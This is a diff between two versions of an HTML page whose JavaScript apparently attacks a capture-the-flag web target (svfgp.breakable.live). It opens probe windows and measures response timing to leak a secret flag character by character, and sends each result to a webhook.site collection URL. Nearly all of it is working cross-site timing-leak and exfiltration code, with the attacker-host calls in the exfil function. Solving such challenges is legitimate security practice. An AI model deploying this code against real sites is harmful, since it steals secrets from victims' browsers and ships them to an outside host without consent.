@@ -1,16 +1,15 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
-// v8 - randomized order, gap-based detection, warmup probe
+// v9 - verified sequential oracle, fresh start
 var T="https://svfgp.breakable.live";
-var W="https://webhook.site/7db4031e-3888-4442-8124-bb8c12cf39c2";
+var W="https://webhook.site/bfddf06d-fc1d-4615-b9e2-1842fa04aede";
 var known="CTF{";
 var HEX="0123456789abcdef";
 
 function exfil(d){
-  var u=W+"?d="+encodeURIComponent(d)+"&t="+Date.now();
-  fetch(u,{mode:"no-cors",cache:"no-store"}).catch(function(){});
+  fetch(W+"?d="+encodeURIComponent(d)+"&t="+Date.now(),{mode:"no-cors",cache:"no-store"}).catch(function(){});
 }
 
-exfil("v8_LOADED");
+exfil("v9_LOADED");
 
 function probeOne(q){
   return new Promise(function(res){
@@ -19,102 +18,128 @@ function probeOne(q){
     var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
       "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
     var t0=performance.now();
-    var wn="pw"+Math.random().toString(36).slice(2,6);
     var w;
-    try{w=window.open(url,wn);}catch(e){res({t:0,src:"err"});return;}
-    if(!w){res({t:0,src:"null"});return;}
+    try{w=window.open(url,"pw");}catch(e){res(-1);return;}
+    if(!w){res(-1);return;}
     var done=false;
-    function fin(ms,src){if(done)return;done=true;try{w.close();}catch(e){}res({t:Math.round(ms),src:src});}
+    function fin(ms){if(done)return;done=true;try{w.close();}catch(e){}res(Math.round(ms));}
     function handler(e){
       if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
         window.removeEventListener("message",handler);
-        fin(performance.now()-t0,"msg");
+        fin(performance.now()-t0);
       }
     }
     window.addEventListener("message",handler);
-    setTimeout(function(){window.removeEventListener("message",handler);fin(performance.now()-t0,"timeout");},4000);
+    setTimeout(function(){window.removeEventListener("message",handler);fin(-1);},3500);
   });
 }
 
-function shuffle(arr){
-  for(var i=arr.length-1;i>0;i--){
-    var j=Math.floor(Math.random()*(i+1));
-    var tmp=arr[i];arr[i]=arr[j];arr[j]=tmp;
+function shuffle(a){for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;}
+
+// Measure baseline: probe a non-matching prefix to get typical fast time
+async function getBaseline(){
+  var times=[];
+  for(var i=0;i<3;i++){
+    var t=await probeOne("ZZZZZZ"+Math.random());
+    if(t>0)times.push(t);
   }
-  return arr;
+  if(times.length===0)return 180;
+  times.sort(function(a,b){return a-b;});
+  return times[Math.floor(times.length/2)]; // median
 }
 
-async function findChar(prefix,pos){
-  // Warmup probe (discard): eliminates first-probe cold start bias
-  await probeOne(prefix+"z");
+// Verify prefix is correct (should trigger PBKDF2, return > baseline+150)
+async function verifyPrefix(prefix,baseline){
+  var t=await probeOne(prefix);
+  return {ok:t > baseline+150, t:t};
+}
 
-  // Test all 16 hex chars in RANDOM order
-  var order=shuffle(HEX.split(""));
+async function findChar(prefix,pos,baseline){
+  // Warmup
+  await probeOne("ZZZZ");
+  
+  // Test all 16 hex chars in random order, collect times
+  var chars=shuffle(HEX.split(""));
   var results=[];
-  for(var i=0;i<order.length;i++){
-    var ch=order[i];
-    var r=await probeOne(prefix+ch);
-    results.push({c:ch,t:r.t,src:r.src});
+  for(var i=0;i<chars.length;i++){
+    var ch=chars[i];
+    var t=await probeOne(prefix+ch);
+    results.push({c:ch,t:t});
+    // Early exit: if clearly above baseline+200ms, likely our match
+    if(t > baseline+200){
+      // Verify by probing again
+      var t2=await probeOne(prefix+ch);
+      if(t2 > baseline+150){
+        exfil("HIT_P"+pos+":"+ch+"="+t+"ms,v="+t2+"ms(bl="+baseline+")");
+        return ch;
+      }
+    }
   }
-
-  // Sort by time descending
+  
+  // No early exit — pick top and verify
   results.sort(function(a,b){return b.t-a.t;});
   var top=results[0], second=results[1];
   var gap=top.t-second.t;
   var info=results.slice(0,4).map(function(x){return x.c+"="+x.t;}).join(",");
-  exfil("P"+pos+":"+info+"|gap="+gap);
-
-  // Accept if clear gap > 100ms between #1 and #2
-  if(gap>100 && top.src==="msg"){
-    return top.c;
+  exfil("P"+pos+":"+info+"|gap="+gap+"|bl="+baseline);
+  
+  if(gap>80){
+    // Verify the top char
+    var vt=await probeOne(prefix+top.c);
+    if(vt > baseline+150){
+      exfil("VER_P"+pos+":"+top.c+"="+vt+"ms_OK");
+      return top.c;
+    }
   }
-
-  // No clear winner — do second pass in different random order
-  exfil("R"+pos+":retry");
-  var order2=shuffle(HEX.split(""));
-  var results2=[];
-  await probeOne(prefix+"z"); // warmup again
-  for(var i=0;i<order2.length;i++){
-    var ch=order2[i];
-    var r=await probeOne(prefix+ch);
-    results2.push({c:ch,t:r.t,src:r.src});
-  }
-  results2.sort(function(a,b){return b.t-a.t;});
-  var top2=results2[0], second2=results2[1];
-  var gap2=top2.t-second2.t;
-  var info2=results2.slice(0,4).map(function(x){return x.c+"="+x.t;}).join(",");
-  exfil("R"+pos+":"+info2+"|gap="+gap2);
-
-  // If both passes agree on the top char, use it
-  if(top.c===top2.c && (gap>50 || gap2>50)){
-    return top.c;
-  }
-
-  // If either has gap>80, trust the one with bigger gap
-  if(gap>gap2 && gap>80) return top.c;
-  if(gap2>gap && gap2>80) return top2.c;
-
-  // Fallback: pick whichever was top in both passes
-  // Combine: for each char, add times from both passes
-  var combined={};
-  results.forEach(function(r){combined[r.c]=(combined[r.c]||0)+r.t;});
-  results2.forEach(function(r){combined[r.c]=(combined[r.c]||0)+r.t;});
-  var best="0",bestT=0;
-  for(var c in combined){if(combined[c]>bestT){bestT=combined[c];best=c;}}
-  exfil("COMBO_P"+pos+":"+best+"="+bestT);
-  return best;
+  
+  // No clear winner - report and stop (don't guess)
+  exfil("STUCK_P"+pos+":no_clear_winner");
+  return null;
 }
 
 async function run(){
-  exfil("v8_START:"+known+"(len="+known.length+")");
+  exfil("v9_START:"+known);
   var t0=Date.now();
+  
+  // Get baseline
+  var baseline=await getBaseline();
+  exfil("BASELINE:"+baseline+"ms");
+  
+  // Verify our starting prefix is valid
+  var v=await verifyPrefix(known,baseline);
+  exfil("VERIFY_PREFIX:"+v.t+"ms(ok="+v.ok+")");
+  if(!v.ok){
+    exfil("BAD_PREFIX:"+known);
+    return;
+  }
 
   while(known.length < 4+64){
     if(Date.now()-t0>53000){exfil("TIME:"+known);break;}
     var pos=known.length-4;
-    var ch=await findChar(known,pos);
+    var ch=await findChar(known,pos,baseline);
+    if(!ch){
+      exfil("ABORT:"+known);
+      break;
+    }
     known+=ch;
     exfil("F:"+known);
+    
+    // Verify new prefix is still valid (PBKDF2 should still trigger)
+    var vr=await verifyPrefix(known,baseline);
+    if(!vr.ok){
+      // Last char was wrong! Remove it and try again
+      exfil("WRONG_CHAR:"+known+"(vt="+vr.t+"ms),backtrack");
+      known=known.slice(0,-1);
+      // Try the position again with more careful measurement
+      var ch2=await findChar(known,pos,baseline);
+      if(ch2 && ch2!==ch){
+        known+=ch2;
+        exfil("FIX:"+known);
+      } else {
+        exfil("CANT_FIX:"+known);
+        break;
+      }
+    }
   }
 
   if(known.length===4+64)known+="}";
